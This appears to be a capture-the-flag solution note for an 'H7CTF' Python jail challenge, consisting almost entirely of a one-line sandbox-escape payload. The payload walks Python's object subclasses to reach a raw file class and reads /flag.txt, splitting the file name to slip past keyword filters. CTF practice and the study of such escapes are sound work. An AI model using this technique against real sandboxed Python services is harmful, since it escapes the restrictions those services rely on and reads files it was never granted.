H7CTF{...} pyjail escape - see writeup/README.md.
PAYLOAD (for /flag.txt):
[c for c in [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_IOBase'][0].__subclasses__() if c.__name__=='_RawIOBase'][0].__subclasses__()[0]('/'+'fl'+'ag.txt').read()
